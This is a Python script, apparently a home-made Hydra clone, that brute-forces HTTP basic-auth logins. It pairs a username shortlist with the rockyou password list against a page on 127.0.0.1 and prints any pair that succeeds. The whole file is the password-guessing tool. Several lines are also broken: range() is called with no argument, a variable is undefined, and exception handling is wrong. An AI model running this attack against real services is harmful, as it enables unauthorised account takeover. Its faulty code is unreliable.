from multiprocessing import Process, Event
import requests, os, re

f = open("/home/kaisok/Documentos/Python/KsKhydra/top-usernames-shortlist.txt", "r",encoding="latin-1")
h = open("/usr/share/wordlists/rockyou.txt", "r",encoding="latin-1")
user = f.readlines()
f.close()
passwd = h.readlines()
h.close()

def hydra(usr):
    
    for y in passwd:
        y = y.strip("\n")

        if y.isalpha():

            print("Testing: {}:{}".format(usr.strip("\n"), y.strip("\n")), end="\r")

            try:

                req = requests.get("http://{}:{}@127.0.0.1/host1/index.html".format(str(usr), str(y)))

                if req.status_code == 200:

                    print("#"*40, end="\r\n")
                    print("User: {}\nPassword: {}".format(usr, y), end="\n")
                    print("#"*40, end="\r\n")

            except KeyboardInterrupt():

                exit()

            except Exception as e:
                print(e)

                pass
        else:
            continue

#Leemos los usuarios (pillamos 4)
for x in range():
   
    if __name__ == "__main__":
        procs = []
        proc = Process(target=hydra)
        procs.append(proc)
        proc.start()

        for i in range(4):

            proc = Process(target=hydra, args=usr)
            procs.append(proc)
            proc.start()


hydra("root")